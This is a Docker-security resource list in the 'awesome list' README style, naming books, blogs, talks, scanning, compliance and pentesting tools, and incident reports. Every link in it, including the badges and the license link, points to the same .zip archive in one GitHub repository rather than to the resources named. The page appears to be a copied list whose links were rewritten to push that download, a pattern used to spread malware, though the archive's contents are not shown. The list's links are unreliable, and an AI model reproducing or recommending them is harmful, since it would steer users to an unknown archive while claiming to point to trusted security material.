# Awesome Docker Security [![Awesome](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

List of awesome resources about docker security included books, blogs, video, tools and cases.

## Table of Contents

  - [Books](#books)
  - [Blogs](#blogs)
  - [Videos](#videos)
  - [Tools](#tools)
  - [Cases](#cases)

## Books

- [Container Security by Liz Rice](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Docker Security by Adrian Mouat](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Advanced Infrastructure Penetration Testing by Chiheb Chebbi](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

## Blogs

- [Docker Security](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [OWASP Docker Security](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Introduction to Container Security Understanding the isolation properties of Docker](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Anatomy of a hack: Docker Registry](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Hunting for Insecure Docker Registries](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [How Abusing Docker API Lead to Remote Code Execution](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Using Docker-in-Docker for your CI or testing environment? Think twice](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Vulnerability Exploitation in Docker Container Environments](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Mitigating High Severity RunC Vulnerability (CVE-2019-5736)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Building Secure Docker Images - 101](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Dockerfile Security Checks using OPA Rego Policies with Conftest](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [An Attacker Looks at Docker: Approaching Multi-Container Applications](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Lesson 4: Hacking Containers Like A Boss ](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [How To Secure Docker Images With Encryption Through Containerd](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

## Videos

- [Best practices for building secure Docker images](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [OWASP Bay Area - Attacking & Auditing Docker Containers Using Open Source tools](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [DockerCon 2018 - Docker Container Security](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [DokcerCon 2019 - Container Security: Theory & Practice at Netflix](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [DockerCon 2019 - Hardening Docker daemon with Rootless mode](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [RSAConference 2019 - How I Learned Docker Security the Hard Way (So You Don’t Have To)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [BSidesSF 2020 - Checking Your --privileged Container](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Live Container Hacking: Capture The Flag - Andrew Martin (Control Plane) vs Ben Hall (Katacoda)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

## Tools

### Container Runtime

- [gVisor](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An application kernel, written in Go, that implements a substantial portion of the Linux system surface. 
- [Kata Container](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source project and community working to build a standard implementation of lightweight Virtual Machines (VMs) that feel and perform like containers, but provide the workload isolation and security advantages of VMs.  
- [sysbox](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open-source container runtime that enables Docker containers to act as virtual servers capable of running software such as Systemd, Docker, and Kubernetes in them. Launch inner containers, knowing that the outer container is strongly isolated from the underlying host.
- [Firecracker](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source virtualization technology that is purpose-built for creating and managing secure, multi-tenant container and function-based services.

### Container Scanning

- [trivy](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A simple and comprehensive Vulnerability Scanner for Containers, suitable for CI.
- [Clair](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Vulnerability Static Analysis to discovering Common Vulnerability Exposure (CVE) on containers and can integrate with CI like Gitlab CI which included on their [template](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip).
- [Harbor](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source trusted cloud native registry project that equipped with several features such as RESTful API, Registry, Vulnerability Scanning, RBAC and etc.
- [Anchore Engine](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source project that provides a centralized service for inspection, analysis and certification of container images. Access the engine through a RESTful API and Anchore CLI then integrated with your CI/CD pipeline.
- [grype](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source project from Anchore to perform a vulnerability scanning for container images and filesystems.
- [Dagda](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A tool to perform static analysis of known vulnerabilities, trojans, viruses, malware & other malicious threats in docker images/containers and to monitor the docker daemon and running docker containers for detecting anomalous activities.
- [Synk](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - CLI and build-time tool to find & fix known vulnerabilities in open-source dependencies support container scanning, application security.

### Compliance

- [Docker Bench for Security](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A script that checks for dozens of common best-practices around deploying Docker containers in production.
- [CIS Docker Benchmark - InSpec profile](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Compliance profile implement the CIS Docker 1.13.0 Benchmark in an automated way to provide security best-practice tests around Docker daemon and containers in a production environment
- [lynis](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Security auditing tool for Linux, macOS, and UNIX-based systems. Assists with compliance testing (HIPAA/ISO27001/PCI DSS) and system hardening. Agentless, and installation optional.
- [Open Policy Agent (OPA)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - An open source, general-purpose policy engine that enables unified, context-aware policy enforcement across the entire stack.
- [opa-docker-authz](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A policy-enabled authorization plugin for Docker. 

### Pentesting

- [BOtB](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Container analysis and exploitation tool designed to be used by pentesters and engineers while also being CI/CD friendly with common CI/CD technologies.
- [Gorsair](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A penetration testing tool for discovering and remotely accessing Docker APIs from vulnerable Docker containers.
- [Cloud Container Attack Tool](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A tool for testing security of container environments. 
- [DEEPCE](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A tool for docker enumeration, escalation of privileges and container escapes. 

### Playground

- [DockerSecurityPlayground (DSP)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A Microservices-based framework for the study of network security and penetration test techniques.
- [Katacoda Courses: Docker Security](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Learn Docker Security using Interactive Browser-Based Scenarios.
- [Docker Security by Contol Plane](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Learn Docker Security  from Control Plane.
- [Play with Docker](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A simple, interactive, fun playground to learn Docker and its **free**.

### Monitoring

- [Falco](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Cloud Native Runtime Security.
- [Wazuh](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Free, open source and enterprise-ready security monitoring solution for threat detection, integrity monitoring, incident response and compliance.
- [Weave Scope](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Detects processes, containers, hosts. No kernel modules, no agents, no special libraries, no coding. Seamless integration with Docker, Kubernetes, DCOS and AWS ECS.

### Others

- [dive](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A tool for exploring each layer in a docker image.
- [hadolint](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A smarter Dockerfile linter that helps you build best practice Docker images.
- [dockle](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Container image linter, help you to build the best practices Docker image.
- [docker_auth](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Authentication server for Docker Registry 2.
- [bane](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Custom & better AppArmor profile generator for Docker containers.
- [secret-diver](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Analyzes secrets in containers.
- [confine](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - Generate SECCOMP profiles for Docker images.
- [imgcrypt](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - OCI Image Encryption Package.
- [lazydocker](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip) - A tool to manage docker images and containers easily.

## Use Cases

- [How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [A hacking group is hijacking Docker systems with exposed API endpoints](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Hundreds of Vulnerable Docker Hosts Exploited by Cryptocurrency Miners](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Cryptojacking worm compromised over 2,000 Docker hosts](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Docker API vulnerability allows hackers to mine Monero](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Docker Registry HTTP API v2 exposed in HTTP without authentication leads to docker images dumping and poisoning](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [How dangerous is Request Splitting, a vulnerability in Golang or how we found the RCE in Portainer and hacked Uber](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Docker Registries Expose Hundreds of Orgs to Malware, Data Theft](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Doki Backdoor Infiltrates Docker Servers in the Cloud](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [Threat Actors Now Target Docker via Container Escape Features](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)
- [CVE-2020-15157: Vulnerability in Containerd Can Leak Cloud Credentials](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

## [Contributing](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)

Your contributions are always welcome.

## License

[![CC0](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)](https://raw.githubusercontent.com/joymondal/awesome-docker-security/master/reflourish/awesome-docker-security.zip)